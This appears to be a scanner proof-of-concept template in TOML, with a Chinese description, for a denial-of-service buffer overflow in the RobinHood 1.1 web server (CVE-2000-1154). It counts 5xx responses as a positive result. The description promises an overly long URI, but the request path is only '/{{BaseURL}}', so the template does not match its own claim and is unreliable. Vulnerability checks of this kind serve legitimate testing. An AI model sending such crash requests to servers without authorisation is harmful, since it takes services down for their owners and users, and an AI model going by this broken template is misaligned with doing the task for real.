[info]
author = "ave"
description = "通过发送超长 HTTP 请求验证 RobinHood 1.1 Web 服务器 RHConsole 组件的缓冲区溢出漏洞。向目标发送超长 URI 路径的 GET 请求，触发缓冲区溢出导致服务拒绝响应。"
id = "POC-AVE-2000-0826"
name = "RobinHood 1.1 HTTP Long Request Buffer Overflow PoC"
severity = "medium"
tags = ["ave-2000-0826"]
vuln_id = [
    "CVE-2000-1154",
    "AVE-2000-0826",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
    504,
]
type = "status"
